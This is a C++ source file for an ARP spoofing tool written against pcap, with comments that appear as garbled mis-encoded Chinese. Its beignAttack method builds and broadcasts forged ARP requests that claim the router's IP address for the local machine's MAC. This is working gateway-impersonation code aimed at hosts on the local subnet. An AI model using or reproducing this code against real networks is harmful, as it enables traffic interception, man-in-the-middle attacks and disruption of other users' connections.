#include "ArpSpoof.h"

////////////////////////////////////////// public //////////////////////////////////////////

ArpSpoof::ArpSpoof()
{
	m_Adapter.GetNetAddrOfRouter((PDWORD)&m_router_ip, m_router_mac); // ·������ IP �� MAC

	if (!m_Adapter.GetLocalMac(m_local_mac)) // ���� MAC
		printf("\nError: cannot get the MAC addr of your PC!");

	m_Adapter.getLocalIpAndMask(&m_local_ip, &m_netmask);
	m_netaddr = m_local_ip & m_netmask; // ���������������ַ
	m_hostsnum = htonl(~m_netmask) - 1; // ������
}

ArpSpoof::~ArpSpoof()
{

}

u_int ArpSpoof::getNetAddr()
{
	return m_netaddr;
}

u_int ArpSpoof::getHostsnum()
{
	return m_hostsnum;
}

void ArpSpoof::beignAttack(u_int dst_ip)
{
	u_char packet[sizeof(arp_packet)];

	make_arp_packet(packet, m_local_mac, m_router_ip, dst_ip);

	if (pcap_sendpacket(m_Adapter.getAdapterHandle(), packet, sizeof(packet)) < 0)
	{
		printf("\npacket sending error");
	}
}

////////////////////////////////////////// private //////////////////////////////////////////

void ArpSpoof::make_arp_packet(u_char* packet, u_char* src_mac, u_int src_ip, u_int dst_ip)
{
	arp_packet arp_pkt;

	// -----------------�����̫���ײ�-----------------
	// Դ MAC
	memcpy(arp_pkt.eh.saddr, src_mac, MAC_LEN);
	// Ŀ�� MAC ��ַΪ�㲥��ַ FF-FF-FF-FF-FF-FF
	memset(arp_pkt.eh.daddr, 0xFF, MAC_LEN);
	// ��̫���ϲ�Э��Ϊ ARP
	arp_pkt.eh.prototype = htons(ETHPROTOCAL_ARP);

	// -----------------��� ARP �ײ�-----------------
	// Ӳ������Ϊ Ethernet
	arp_pkt.ah.arp_hrd = htons(HARD_ETHERNET);
	// ARP �ϲ�Э��Ϊ IPv4
	arp_pkt.ah.arp_pro = htons(ETHPROTOCAL_IPV4);
	// Ӳ����ַ����Ϊ MAC_LEN
	arp_pkt.ah.arp_hln = MAC_LEN;
	// Э���ַ����Ϊ IP_LEN
	arp_pkt.ah.arp_pln = IPV4_LEN;
	// ����ѡ��: ARP ����
	arp_pkt.ah.arp_op = htons(ARP_REQUEST);
	// Ŀ�� MAC ��ַ, ���0
	memset(arp_pkt.ah.arp_thaddr, 0, MAC_LEN);
	// Ŀ�� IP ��ַ
	arp_pkt.ah.arp_tpaddr = dst_ip;
	// Դ MAC ��ַ
	memcpy(arp_pkt.ah.arp_shaddr, src_mac, MAC_LEN);
	// Դ IP ��ַ
	arp_pkt.ah.arp_spaddr = src_ip;

	memset(arp_pkt.padding, 0xCC, sizeof(arp_pkt.padding));
	memcpy(packet, &arp_pkt, sizeof(arp_pkt));
}

///////////////////////////////////////////////////////////////////////////////////////////////
